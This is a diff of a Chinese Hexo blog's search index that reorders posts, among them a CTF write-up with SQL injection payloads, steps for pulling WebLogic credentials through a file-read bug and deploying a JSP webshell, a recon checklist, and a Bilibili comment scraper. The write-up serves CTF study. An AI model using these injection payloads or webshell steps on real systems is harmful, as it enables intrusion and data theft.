 <h1 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h1><p><strong>本项目仅供学习交流使用，如作他用所承受的任何直接、间接法律责任一概与作者无关</strong><br><strong>如果此项目侵犯了您或者您公司的权益，请立即联系我删除</strong></p>
 <p>如果你有不懂的,或者需要api不会搭建的,欢迎联系我,我会看心情给你解答（狗头）</p>
 <blockquote>
-<p>邮箱： <a href="mailto:&#105;&#x6b;&#x61;&#x65;&#107;&#107;&#x6b;&#64;&#x64;&#105;&#110;&#103;&#116;&#x61;&#108;&#x6b;&#46;&#99;&#111;&#109;">&#105;&#x6b;&#x61;&#x65;&#107;&#107;&#x6b;&#64;&#x64;&#105;&#110;&#103;&#116;&#x61;&#108;&#x6b;&#46;&#99;&#111;&#109;</a></p>
+<p>邮箱： <a href="mailto:&#105;&#x6b;&#97;&#101;&#x6b;&#x6b;&#x6b;&#64;&#100;&#105;&#110;&#x67;&#116;&#97;&#x6c;&#107;&#x2e;&#x63;&#111;&#109;">&#105;&#x6b;&#97;&#101;&#x6b;&#x6b;&#x6b;&#64;&#100;&#105;&#110;&#x67;&#116;&#97;&#x6c;&#107;&#x2e;&#x63;&#111;&#109;</a></p>
 </blockquote>
 ]]></content>
       <categories>
@@ -2068,6 +2069,19 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </categories>
       <tags>
         <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息搜集</title>
+    <url>/posts/b21d488/</url>
+    <content><![CDATA[<h2 id="phps"><a href="#phps" class="headerlink" title="phps"></a>phps</h2><h2 id="git"><a href="#git" class="headerlink" title=".git/"></a>.git/</h2><h2 id="svn"><a href="#svn" class="headerlink" title=".svn/"></a>.svn/</h2><h2 id="swp"><a href="#swp" class="headerlink" title=".swp"></a>.swp</h2><p>ls -al</p>
+<h2 id="http-dbcha-com"><a href="#http-dbcha-com" class="headerlink" title="http://dbcha.com/"></a><a href="http://dbcha.com/">http://dbcha.com/</a></h2><h2 id="admin密码"><a href="#admin密码" class="headerlink" title="/admin密码"></a>/admin密码</h2><h2 id="editor"><a href="#editor" class="headerlink" title="editor"></a>editor</h2><h2 id="tz-php探针"><a href="#tz-php探针" class="headerlink" title="tz.php探针"></a>tz.php探针</h2><h2 id="cdn-绕过"><a href="#cdn-绕过" class="headerlink" title="cdn 绕过"></a>cdn 绕过</h2>]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -2105,19 +2119,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       <tags>
         <tag>python</tag>
         <tag>爬虫</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信息搜集</title>
-    <url>/posts/b21d488/</url>
-    <content><![CDATA[<h2 id="phps"><a href="#phps" class="headerlink" title="phps"></a>phps</h2><h2 id="git"><a href="#git" class="headerlink" title=".git/"></a>.git/</h2><h2 id="svn"><a href="#svn" class="headerlink" title=".svn/"></a>.svn/</h2><h2 id="swp"><a href="#swp" class="headerlink" title=".swp"></a>.swp</h2><p>ls -al</p>
-<h2 id="http-dbcha-com"><a href="#http-dbcha-com" class="headerlink" title="http://dbcha.com/"></a><a href="http://dbcha.com/">http://dbcha.com/</a></h2><h2 id="admin密码"><a href="#admin密码" class="headerlink" title="/admin密码"></a>/admin密码</h2><h2 id="editor"><a href="#editor" class="headerlink" title="editor"></a>editor</h2><h2 id="tz-php探针"><a href="#tz-php探针" class="headerlink" title="tz.php探针"></a>tz.php探针</h2><h2 id="cdn-绕过"><a href="#cdn-绕过" class="headerlink" title="cdn 绕过"></a>cdn 绕过</h2>]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -2163,11 +2164,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       <categories>
         <category>随笔</category>
       </categories>
-  </entry>
-  <entry>
-    <title>反序列化总结</title>
-    <url>/posts/1e128b6c/</url>
-    <content><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
   </entry>
   <entry>
     <title>反弹shell测试</title>
@@ -2230,33 +2226,9 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
-    <title>国庆赛部分赛题复现</title>
-    <url>/posts/bfdb9200/</url>
-    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
-<p>环境有点问题，复现一半出不来了</p>
-</blockquote>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
-
-<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
-<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
-<p>先通过任意文件读取漏洞获得密钥和密文</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
-
-<p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
-<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
-<p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
-<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
-<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
-]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-      </tags>
+    <title>反序列化总结</title>
+    <url>/posts/1e128b6c/</url>
+    <content><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
   </entry>
   <entry>
     <title>文件上传总结</title>
@@ -2338,6 +2310,35 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
+    <title>国庆赛部分赛题复现</title>
+    <url>/posts/bfdb9200/</url>
+    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
+<p>环境有点问题，复现一半出不来了</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure>
+
+<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p>
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p>
+<p>先通过任意文件读取漏洞获得密钥和密文</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure>
+
+<p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p>
+<p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p>
+<p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p>
+<p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p>
+<p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>
+]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>暑假总结</title>
     <url>/posts/123f4dc2/</url>
     <content><![CDATA[<p>不知不觉暑假结束了，这两天写完实习报告终于有时间能简单的总结一下了。</p>
@@ -2361,42 +2362,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       <categories>
         <category>随笔</category>
       </categories>
-  </entry>
-  <entry>
-    <title>爬取冰冰vlog.001评论&amp;&amp;做词云</title>
-    <url>/posts/6d65a59f/</url>
-    <content><![CDATA[<blockquote>
-<p>python小白，纯属来玩的（狗头）</p>
-</blockquote>
-<h1 id="库准备（推荐清华镜像安装）"><a href="#库准备（推荐清华镜像安装）" class="headerlink" title="库准备（推荐清华镜像安装）"></a>库准备（推荐清华镜像安装）</h1><ol>
-<li>requests</li>
-<li>bs4</li>
-<li>jieba</li>
-<li>wordcloud</li>
-<li>imageio</li>
-<li>matplotlib</li>
-</ol>
-<h1 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h1><h2 id="爬取评论"><a href="#爬取评论" class="headerlink" title="爬取评论"></a>爬取评论</h2><blockquote>
-<p>代码直接贴上了，自行研究</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_html</span>(<span class="params">url</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.get(url, timeout=<span class="number">30</span>,headers=headers)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.endcodding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">url</span>):</span></span><br><span class="line">    comments = []</span><br><span class="line">    html = get_html(url)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s=json.loads(html)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;jsonload error&quot;</span>)   </span><br><span class="line">    num=<span class="built_in">len</span>(s[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;replies&#x27;</span>]) </span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;num:</span><br><span class="line">        comment=s[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;replies&#x27;</span>][i]</span><br><span class="line">        InfoDict=&#123;&#125;</span><br><span class="line">        InfoDict[<span class="string">&#x27;Uname&#x27;</span>]=comment[<span class="string">&#x27;member&#x27;</span>][<span class="string">&#x27;uname&#x27;</span>]</span><br><span class="line">        InfoDict[<span class="string">&#x27;Like&#x27;</span>]=comment[<span class="string">&#x27;like&#x27;</span>] </span><br><span class="line">        InfoDict[<span class="string">&#x27;Content&#x27;</span>]=comment[<span class="string">&#x27;content&#x27;</span>][<span class="string">&#x27;message&#x27;</span>] </span><br><span class="line">        InfoDict[<span class="string">&#x27;Time&#x27;</span>]=time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>,time.localtime(comment[<span class="string">&#x27;ctime&#x27;</span>])) </span><br><span class="line">        comments.append(InfoDict)</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> comments</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Out2File</span>(<span class="params"><span class="built_in">dict</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;BiliBiliComments.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> comment <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">            i=i+<span class="number">1</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.write(<span class="string">&#x27;姓名：&#123;&#125;\t  点赞数：&#123;&#125;\t \n 评论内容：&#123;&#125;\t  评论时间：&#123;&#125;\t \n &#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">                    comment[<span class="string">&#x27;Uname&#x27;</span>], comment[<span class="string">&#x27;Like&#x27;</span>], comment[<span class="string">&#x27;Content&#x27;</span>], comment[<span class="string">&#x27;Time&#x27;</span>]))</span><br><span class="line">                f.write(<span class="string">&quot;-----------------\n&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="string">&quot;out2File error&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;当前页面保存完成&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    e=<span class="number">0</span></span><br><span class="line">    page=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> e == <span class="number">0</span> :</span><br><span class="line">        url = <span class="string">&quot;https://api.bilibili.com/x/v2/reply?pn=&quot;</span>+ <span class="built_in">str</span>(page)+<span class="string">&quot;&amp;type=1&amp;oid=800760067&amp;sort=2&quot;</span> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print()</span><br><span class="line">            content=get_content(url)</span><br><span class="line">            print(<span class="string">&quot;page:&quot;</span>,page)</span><br><span class="line">            Out2File(content)</span><br><span class="line">            page=page+<span class="number">1</span></span><br><span class="line">            <span class="comment"># 为了降低被封ip的风险，每爬20页便歇5秒。</span></span><br><span class="line">            <span class="keyword">if</span> page%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">                time.sleep(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            e=<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="生成词云"><a href="#生成词云" class="headerlink" title="生成词云"></a>生成词云</h2><p>这个需要先有个图片，随便网上找，然后和py放在一个文件夹下。</p>
-<blockquote>
-<p>代码附上（文件，图片改成自己的）</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> jieba.analyse</span><br><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud,ImageColorGenerator</span><br><span class="line"><span class="keyword">from</span> imageio <span class="keyword">import</span> imread</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wc</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,txt_file,img_file,font_file</span>):</span></span><br><span class="line">    self.f = <span class="built_in">open</span>(txt_file,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    self.txt = self.f.read()  </span><br><span class="line">    self.f.close()</span><br><span class="line">    self.tags = jieba.analyse.extract_tags(self.txt,topK=<span class="number">100</span>)</span><br><span class="line">    self.text = <span class="string">&#x27; &#x27;</span>.join(self.tags)</span><br><span class="line">    self.img = imread(img_file)</span><br><span class="line">    self.wc = WordCloud(font_path=font_file,background_color=<span class="string">&#x27;white&#x27;</span>,max_words=<span class="number">100</span>,mask=self.img,max_font_size=<span class="number">80</span>)</span><br><span class="line">    self.word_cloud = self.wc.generate(self.text)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">show_wc</span>(<span class="params">self</span>):</span></span><br><span class="line">    plt.imshow(self.word_cloud)</span><br><span class="line">    plt.axis(<span class="string">&quot;off&quot;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  mywc = wc(<span class="string">&#x27;BiliBiliComments.txt&#x27;</span>,<span class="string">&#x27;u=2959490536,2877096479&amp;fm=26&amp;gp=0.jpg&#x27;</span>,<span class="string">&#x27;simsun.ttc&#x27;</span>)</span><br><span class="line">  mywc.show_wc()</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><strong>还是那句话，冰冰真可爱（狗头）</strong></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>哎，我就是玩</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-      </tags>
   </entry>
   <entry>
     <title>线性规划与整数线性规划</title>
@@ -2457,6 +2422,42 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </categories>
       <tags>
         <tag>蓝桥杯</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>爬取冰冰vlog.001评论&amp;&amp;做词云</title>
+    <url>/posts/6d65a59f/</url>
+    <content><![CDATA[<blockquote>
+<p>python小白，纯属来玩的（狗头）</p>
+</blockquote>
+<h1 id="库准备（推荐清华镜像安装）"><a href="#库准备（推荐清华镜像安装）" class="headerlink" title="库准备（推荐清华镜像安装）"></a>库准备（推荐清华镜像安装）</h1><ol>
+<li>requests</li>
+<li>bs4</li>
+<li>jieba</li>
+<li>wordcloud</li>
+<li>imageio</li>
+<li>matplotlib</li>
+</ol>
+<h1 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h1><h2 id="爬取评论"><a href="#爬取评论" class="headerlink" title="爬取评论"></a>爬取评论</h2><blockquote>
+<p>代码直接贴上了，自行研究</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_html</span>(<span class="params">url</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.get(url, timeout=<span class="number">30</span>,headers=headers)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    r.endcodding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">url</span>):</span></span><br><span class="line">    comments = []</span><br><span class="line">    html = get_html(url)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s=json.loads(html)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;jsonload error&quot;</span>)   </span><br><span class="line">    num=<span class="built_in">len</span>(s[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;replies&#x27;</span>]) </span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;num:</span><br><span class="line">        comment=s[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;replies&#x27;</span>][i]</span><br><span class="line">        InfoDict=&#123;&#125;</span><br><span class="line">        InfoDict[<span class="string">&#x27;Uname&#x27;</span>]=comment[<span class="string">&#x27;member&#x27;</span>][<span class="string">&#x27;uname&#x27;</span>]</span><br><span class="line">        InfoDict[<span class="string">&#x27;Like&#x27;</span>]=comment[<span class="string">&#x27;like&#x27;</span>] </span><br><span class="line">        InfoDict[<span class="string">&#x27;Content&#x27;</span>]=comment[<span class="string">&#x27;content&#x27;</span>][<span class="string">&#x27;message&#x27;</span>] </span><br><span class="line">        InfoDict[<span class="string">&#x27;Time&#x27;</span>]=time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>,time.localtime(comment[<span class="string">&#x27;ctime&#x27;</span>])) </span><br><span class="line">        comments.append(InfoDict)</span><br><span class="line">        i=i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> comments</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Out2File</span>(<span class="params"><span class="built_in">dict</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;BiliBiliComments.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        i=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> comment <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">            i=i+<span class="number">1</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.write(<span class="string">&#x27;姓名：&#123;&#125;\t  点赞数：&#123;&#125;\t \n 评论内容：&#123;&#125;\t  评论时间：&#123;&#125;\t \n &#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">                    comment[<span class="string">&#x27;Uname&#x27;</span>], comment[<span class="string">&#x27;Like&#x27;</span>], comment[<span class="string">&#x27;Content&#x27;</span>], comment[<span class="string">&#x27;Time&#x27;</span>]))</span><br><span class="line">                f.write(<span class="string">&quot;-----------------\n&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="string">&quot;out2File error&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;当前页面保存完成&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    e=<span class="number">0</span></span><br><span class="line">    page=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> e == <span class="number">0</span> :</span><br><span class="line">        url = <span class="string">&quot;https://api.bilibili.com/x/v2/reply?pn=&quot;</span>+ <span class="built_in">str</span>(page)+<span class="string">&quot;&amp;type=1&amp;oid=800760067&amp;sort=2&quot;</span> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print()</span><br><span class="line">            content=get_content(url)</span><br><span class="line">            print(<span class="string">&quot;page:&quot;</span>,page)</span><br><span class="line">            Out2File(content)</span><br><span class="line">            page=page+<span class="number">1</span></span><br><span class="line">            <span class="comment"># 为了降低被封ip的风险，每爬20页便歇5秒。</span></span><br><span class="line">            <span class="keyword">if</span> page%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">                time.sleep(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            e=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="生成词云"><a href="#生成词云" class="headerlink" title="生成词云"></a>生成词云</h2><p>这个需要先有个图片，随便网上找，然后和py放在一个文件夹下。</p>
+<blockquote>
+<p>代码附上（文件，图片改成自己的）</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> jieba.analyse</span><br><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud,ImageColorGenerator</span><br><span class="line"><span class="keyword">from</span> imageio <span class="keyword">import</span> imread</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wc</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,txt_file,img_file,font_file</span>):</span></span><br><span class="line">    self.f = <span class="built_in">open</span>(txt_file,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    self.txt = self.f.read()  </span><br><span class="line">    self.f.close()</span><br><span class="line">    self.tags = jieba.analyse.extract_tags(self.txt,topK=<span class="number">100</span>)</span><br><span class="line">    self.text = <span class="string">&#x27; &#x27;</span>.join(self.tags)</span><br><span class="line">    self.img = imread(img_file)</span><br><span class="line">    self.wc = WordCloud(font_path=font_file,background_color=<span class="string">&#x27;white&#x27;</span>,max_words=<span class="number">100</span>,mask=self.img,max_font_size=<span class="number">80</span>)</span><br><span class="line">    self.word_cloud = self.wc.generate(self.text)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">show_wc</span>(<span class="params">self</span>):</span></span><br><span class="line">    plt.imshow(self.word_cloud)</span><br><span class="line">    plt.axis(<span class="string">&quot;off&quot;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  mywc = wc(<span class="string">&#x27;BiliBiliComments.txt&#x27;</span>,<span class="string">&#x27;u=2959490536,2877096479&amp;fm=26&amp;gp=0.jpg&#x27;</span>,<span class="string">&#x27;simsun.ttc&#x27;</span>)</span><br><span class="line">  mywc.show_wc()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>还是那句话，冰冰真可爱（狗头）</strong></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>哎，我就是玩</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
